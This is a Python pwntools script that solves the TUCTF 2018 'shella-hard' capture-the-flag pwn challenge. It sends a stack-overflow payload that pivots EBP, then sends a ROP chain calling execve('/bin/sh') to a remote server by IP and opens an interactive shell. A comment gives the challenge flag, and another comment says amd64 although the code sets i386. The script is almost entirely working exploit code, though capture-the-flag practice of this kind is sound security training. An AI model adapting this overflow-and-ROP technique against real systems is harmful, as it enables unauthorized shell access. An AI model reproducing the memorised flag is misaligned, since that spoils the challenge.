"""
TUCTF 2018 shell-hard pwn challenge solution
"""
# Imports
import re, sys, time
from pwn import *
# Set pwntools context to amd64
context.update(arch='i386')

def rop_payload(elf):
  """
  Creates a rop chain to execute execve('/bin/sh\x00', 0x00, 0x00).
  """
  rop = ROP(elf)
  rop.execve(next(elf.search('/bin/sh\x00')), 0x00, 0x00)

  return str(rop)

def main():
  """
  Runs on program execution.
  """
  # Read challenge binary into pwntools
  elf = ELF('shella-hard')

  # Connect to remote server
  p = remote('3.16.169.157', 12345)

  # EBP = 0x0804A500
  # RET = main+8 (lea eax, [ebp+buf])
  # Read size = 0x100
  p.sendline('A' * 16 + p32(0x0804A500) + p32(0x08048443) + p32(0x100))

  # Return to rop chain using the leave instruction
  p.sendline('A' * 20 + rop_payload(elf) + 'C' * 50)

  # Interact with the shell
  p.interactive() # TUCTF{175_wh475_1n51d3_7h47_c0un75}

  
# Hook
if __name__ == '__main__':
  main()